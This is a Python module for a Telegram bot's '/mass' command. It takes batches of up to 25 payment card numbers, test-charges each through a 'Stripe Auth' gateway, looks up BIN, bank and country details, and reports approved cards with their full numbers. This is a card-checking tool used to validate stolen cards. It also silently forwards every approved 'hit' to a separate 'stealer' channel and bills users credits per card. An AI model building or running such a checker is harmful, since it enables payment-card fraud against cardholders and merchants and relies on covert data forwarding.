import json
import time
import asyncio
import httpx
from pyrogram import Client, filters
from datetime import timedelta
from FUNC.usersdb_func import *
from FUNC.defs import *
from .gate import *
from .response import *
from TOOLS.check_all_func import *
from TOOLS.getcc_for_mass import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

# Owner DM Link (clickable ㊕)
OWNER_DM = "https://t.me/spid_3r"
SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"

async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
    """Send approved card to stealer channel (NO CC, NO BIN, NO Bank, NO Country)"""
    try:
        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅

{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}

{SYMBOL} 𝗧𝗼𝗼ᴋ {time_taken:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await client.send_message(chat_id=-1002549777556, text=stealer_msg, parse_mode="HTML")
    except Exception as e:
        print(f"[Stealer Error] {e}")

async def process_single_card(fullcc, user_id, client, first_name, role):
    """Process one card, return status, response, and bin details"""
    try:
        session = httpx.AsyncClient(timeout=30)
        result = await create_cvv_charge(fullcc, session)
        getresp = await get_charge_resp(result, user_id, fullcc)
        response = getresp["response"]
        status = getresp["status"]
        await session.aclose()

        # Get BIN details
        cc_num = fullcc.split('|')[0]
        getbin = await get_bin_details(cc_num)
        brand = getbin[0] if len(getbin) > 0 else "Unknown"
        type_ = getbin[1] if len(getbin) > 1 else "Unknown"
        level = getbin[2] if len(getbin) > 2 else "Unknown"
        bank = getbin[3] if len(getbin) > 3 else "Unknown"
        country = getbin[4] if len(getbin) > 4 else "Unknown"
        flag = getbin[5] if len(getbin) > 5 else ""
        currency = getbin[6] if len(getbin) > 6 else "Unknown"

        # Normalize status to use emojis
        if "Approved" in status or "✅" in status:
            final_status = "Approved ✅"
        elif "Declined" in status or "❌" in status:
            final_status = "Declined ❌"
        else:
            final_status = status

        return final_status, response, brand, type_, level, bank, country, flag

    except Exception as e:
        return "Error", str(e)[:50], "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", ""

@Client.on_message(filters.command("mass", [".", "/"]))
async def stripe_mass_auth_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = str(message.from_user.first_name)
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        getcc = await getcc_for_mass(message, role)
        if not getcc[0]:
            await message.reply_text(getcc[1], message.id)
            return

        ccs = getcc[1]
        total_cards = len(ccs)
        max_allowed = 25  # original limit, keep
        if total_cards > max_allowed:
            await message.reply_text(f"✦ ᴍᴀx {max_allowed} ᴄᴄ ᴀʟʟᴏᴡᴇᴅ. ʏᴏᴜ ᴘʀᴏᴠɪᴅᴇᴅ {total_cards} ✦", message.id)
            return

        gateway = "Stripe Auth"
        processed = 0
        approved_count = 0
        declined_count = 0
        start_time = time.perf_counter()
        approved_cards = []
        declined_list = []  # store fullcc for declined

        # Initial progress message
        progress_text = f"""Stripe Auth
Admin

{SYMBOL} Response: Starting...

Progress: 0/{total_cards}
Approved ✅: 0
Declined ❌: 0
Remaining: {total_cards}

Checked by: {first_name} ({role})"""

        progress_msg = await message.reply(progress_text, quote=True, parse_mode="HTML")

        for idx, fullcc in enumerate(ccs, 1):
            processed = idx
            remaining = total_cards - processed

            status, response, brand, type_, level, bank, country, flag = await process_single_card(fullcc, user_id, Client, first_name, role)

            if "Approved" in status or "✅" in status:
                approved_count += 1
                response_status = "APPROVED ✅"
                card_time = time.perf_counter() - start_time
                approved_cards.append({
                    "fullcc": fullcc,
                    "status": status,
                    "response": response,
                    "gateway": gateway,
                    "brand": f"{brand} — {type_} — {level}",
                    "bank": bank,
                    "country": country,
                    "flag": flag,
                    "time": card_time
                })
                # Send to stealer (no CC/BIN)
                await send_hit_to_stealer(Client, fullcc, status, response, gateway, card_time, first_name, role)
            else:
                declined_count += 1
                response_status = "DECLINED ❌"
                declined_list.append(fullcc)

            # Update progress message
            try:
                await Client.edit_message_text(
                    message.chat.id,
                    progress_msg.id,
                    f"""Stripe Auth
Admin

{SYMBOL} Response: {response_status}

Progress: {processed}/{total_cards}
Approved ✅: {approved_count}
Declined ❌: {declined_count}
Remaining: {remaining}

Checked by: {first_name} ({role})""",
                    parse_mode="HTML"
                )
            except:
                pass

            await asyncio.sleep(0.5)  # small delay for stability

        # Delete progress message
        await progress_msg.delete()
        elapsed_time = round(time.perf_counter() - start_time, 2)

        # Send each approved card as separate message (full details)
        for card in approved_cards:
            approved_msg = f"""{card['status']}

{SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {card['gateway']}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}
{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}

{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
            await message.reply_text(approved_msg, quote=True, parse_mode="HTML")
            await asyncio.sleep(0.5)

        # Send declined summary
        if declined_count > 0:
            declined_summary = f"""❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ / 𝗘ʀʀᴏʀ 𝗖ᴀʀᴅs ({declined_count})

━━━━━━━━━━━━━━━━━━━━
"""
            for card in declined_list[:15]:
                declined_summary += f"{SYMBOL} {card} → Declined\n"
            if declined_count > 15:
                declined_summary += f"\n... and {declined_count - 15} more declined cards"
            declined_summary += f"""
━━━━━━━━━━━━━━━━━━━━
✅ Approved: {approved_count}
❌ Declined: {declined_count}
📊 Total: {total_cards}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})

━━━━━━━━━━━━━━━━━━━━
<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
            await message.reply_text(declined_summary, quote=True, parse_mode="HTML")
        else:
            await message.reply_text(
                f"""✅ 𝗔𝗹𝗹 𝗖𝗮𝗿𝗱𝘀 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱

━━━━━━━━━━━━━━━━━━━━
📊 Total Cards: {total_cards}
✅ All Approved: {approved_count}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})

━━━━━━━━━━━━━━━━━━━━
<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>""",
                quote=True,
                parse_mode="HTML"
            )

        await massdeductcredit(user_id, total_cards)
        await setantispamtime(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())
